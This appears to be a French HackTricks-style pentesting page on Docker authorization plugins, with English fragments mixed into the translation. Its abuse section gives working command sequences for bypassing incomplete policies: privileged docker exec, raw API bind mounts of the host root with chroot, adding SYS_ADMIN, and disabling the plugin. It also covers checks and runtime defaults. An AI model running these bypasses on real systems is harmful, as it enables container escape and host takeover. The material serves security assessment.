# Plugins d'autorisation à l'exécution

{{#include ../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Les plugins d'autorisation à l'exécution ajoutent une couche de politique supplémentaire qui décide si un appelant peut effectuer une action donnée du daemon. Docker est l'exemple classique. Par défaut, quiconque peut communiquer avec le daemon Docker dispose en pratique d'un large contrôle sur celui-ci. Les plugins d'autorisation tentent de restreindre ce modèle en examinant l'identité utilisateur authentifiée et l'opération API demandée, puis en autorisant ou en refusant la requête selon la politique.

Ce sujet mérite sa propre page car il change le modèle d'exploitation lorsqu'un attaquant a déjà accès à une API Docker ou à un utilisateur du groupe `docker`. Dans de tels environnements, la question n'est plus seulement « puis-je atteindre le daemon ? » mais aussi « le daemon est-il protégé par une couche d'autorisation, et si oui, cette couche peut-elle être contournée via des endpoints non gérés, un parsing JSON faible, ou des permissions de gestion de plugin ? »

## Fonctionnement

Lorsqu'une requête atteint le daemon Docker, le sous-système d'autorisation peut passer le contexte de la requête à un ou plusieurs plugins installés. Le plugin voit l'identité de l'utilisateur authentifié, les détails de la requête, certains headers sélectionnés, et des parties du corps de la requête ou de la réponse lorsque le content-type est adapté. Plusieurs plugins peuvent être chaînés, et l'accès n'est accordé que si tous les plugins permettent la requête.

Ce modèle semble robuste, mais sa sécurité dépend entièrement de la compréhension complète de l'API par l'auteur de la politique. Un plugin qui bloque `docker run --privileged` mais ignore `docker exec`, omet des clés JSON alternatives telles que le champ de haut niveau `Binds`, ou permet l'administration des plugins peut créer une fausse impression de restriction tout en laissant ouvertes des voies directes de privilege-escalation.

## Cibles courantes des plugins

Les domaines importants pour la revue de politique sont :

- les endpoints de création de container
- les champs `HostConfig` tels que `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, et les options de partage de namespaces
- le comportement de `docker exec`
- les endpoints de gestion des plugins
- tout endpoint pouvant déclencher indirectement des actions runtime en dehors du modèle de politique prévu

Historiquement, des exemples comme le plugin `authz` de Twistlock et des plugins éducatifs simples tels que `authobot` ont rendu ce modèle facile à étudier parce que leurs fichiers de politique et leurs chemins de code montraient comment le mapping endpoint→action était réellement implémenté. Pour le travail d'évaluation, la leçon importante est que l'auteur de la politique doit comprendre la surface complète de l'API plutôt que seulement les commandes CLI les plus visibles.

## Abus

Le premier objectif est de déterminer ce qui est réellement bloqué. Si le daemon refuse une action, l'erreur often leaks the plugin name, which helps identify the control in use:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Si vous avez besoin d'un profilage plus large des endpoints, des outils comme `docker_auth_profiler` sont utiles car ils automatisent la tâche autrement répétitive de vérifier quelles routes API et quelles structures JSON sont réellement autorisées par le plugin.

Si l'environnement utilise un plugin personnalisé et que vous pouvez interagir avec l'API, énumérez quels champs d'objet sont réellement filtrés :
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ces vérifications sont importantes parce que de nombreux échecs d'autorisation sont spécifiques aux champs plutôt qu'aux concepts. Un plugin peut rejeter un motif CLI sans bloquer complètement la structure API équivalente.

### Exemple complet : `docker exec` ajoute des privilèges après la création du conteneur

Une politique qui bloque la création de conteneurs privilégiés mais autorise la création de conteneurs non confinés plus `docker exec` peut néanmoins être contournée :
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Si le daemon accepte la deuxième étape, l'utilisateur a récupéré un processus interactif privilégié à l'intérieur d'un conteneur que l'auteur de la politique pensait contraint.

### Exemple complet : Bind Mount Through Raw API

Certaines politiques défaillantes n'inspectent qu'une seule forme JSON. Si le bind mount du système de fichiers racine n'est pas bloqué de manière cohérente, l'hôte peut toujours être monté :
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La même idée peut également apparaître sous `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
### Exemple complet : attribut de capacité non vérifié

L'impact est une évasion complète du système de fichiers de l'hôte. Le détail intéressant est que le bypass provient d'une couverture incomplète de la politique plutôt que d'un bug du noyau.
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Une fois que `CAP_SYS_ADMIN` ou une capacité d'une force similaire est présente, de nombreuses techniques d'évasion décrites dans [capabilities.md](protections/capabilities.md) et [privileged-containers.md](privileged-containers.md) deviennent accessibles.

### Exemple complet : Désactivation du plugin

Si les opérations de plugin-management sont autorisées, le bypass le plus propre peut être de désactiver complètement le contrôle :
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Ceci est une défaillance de politique au niveau du plan de contrôle. La couche d'autorisation existe, mais l'utilisateur qu'elle était censée restreindre conserve toujours la permission de la désactiver.

## Vérifications

Ces commandes visent à identifier si une couche de politique existe et si elle semble complète ou superficielle.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Ce qui est intéressant ici :

- Les messages de refus qui incluent le nom d'un plugin confirment la présence d'une couche d'autorisation et révèlent souvent l'implémentation exacte.
- Une liste de plugins visible par l'attaquant peut suffire à déterminer si des opérations de désactivation ou de reconfiguration sont possibles.
- Une politique qui bloque seulement les actions CLI évidentes mais pas les requêtes API brutes doit être considérée comme contournable tant que le contraire n'est pas prouvé.

## Valeurs par défaut du runtime

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissements manuels courants |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | Daemon access is effectively all-or-nothing unless an authorization plugin is configured | incomplete plugin policy, blacklists instead of allowlists, allowing plugin management, field-level blind spots |
| Podman | Not a common direct equivalent | Podman typically relies more on Unix permissions, rootless execution, and API exposure decisions than on Docker-style authz plugins | exposing a rootful Podman API broadly, weak socket permissions |
| containerd / CRI-O | Different control model | These runtimes usually rely on socket permissions, node trust boundaries, and higher-layer orchestrator controls rather than Docker authz plugins | mounting the socket into workloads, weak node-local trust assumptions |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC and admission controls are the main policy layer | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |
{{#include ../../../banners/hacktricks-training.md}}
